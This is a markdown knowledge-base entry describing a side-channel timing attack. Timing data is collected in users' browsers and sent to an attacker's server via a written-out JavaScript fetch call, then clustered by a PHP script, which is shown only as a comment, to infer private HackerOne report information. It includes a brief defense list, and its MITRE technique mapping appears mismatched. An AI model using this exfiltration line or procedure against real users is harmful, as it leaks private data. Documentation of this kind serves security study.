---
id: proc-uuid-006
tags:
  - data-processing
  - exfiltration
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/miner-php-process]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Archive via Utility]]'
updated_at: '2025-12-14T17:27:50.094Z'
skill_level: advanced
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Archive via Utility]]'
---
# Process-Timings-for-Data-Inference

## Summary

This procedure processes collected timings server-side or offline to cluster data, remove outliers, and compute precise inferences of sensitive user information from HackerOne.

## Description

Timings are sent from the browser to the attacker's server (e.g., via console fetch). A PHP script analyzes clusters using cosine similarity, averages valid timings, estimates response sizes, and derives record counts (size / 185B). This refines guesses for report statuses and IDs.

## Requirements

1. Collected timing data in .txt files
2. PHP environment with writable data dir
3. Hardcoded avg record size (185B)

## Defense

Defensive measures and detection strategies:

- Encrypt or obfuscate response data
- Add noise to timings (random delays)
- Monitor for data exfiltration to external servers

## Objectives

1. Clean and cluster noisy timing data
2. Calculate record counts accurately
3. Exfiltrate profiled user activity

## Instructions

### Step 1: Collect Timings Server-Side

**Context**: JS sends data to attacker endpoint.

**Command** (JS Fetch):
`fetch('https://hqpeak.com/hackeronePoCftw/data/', {method: 'POST', body: JSON.stringify(timings)});`

> Stores in data/ dir.

### Step 2: Run Processing Script

**Context**: Analyze for inferences.

**Command** ([[commands/miner-php-process]]):
```php
// In miner.php: Use 185B avg; cluster with cosine similarity, filter outliers, calc records = (est_size / 185)
```

> Outputs: e.g., "5 new reports".

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Archive via Utility]] Archive via Utility

### Sub-Techniques


## Commands Used

- [[commands/miner-php-process]]

## Tools Used

- [[tools/PHP]]

## Tags

- [[analysis]]
- [[Exfiltration]]
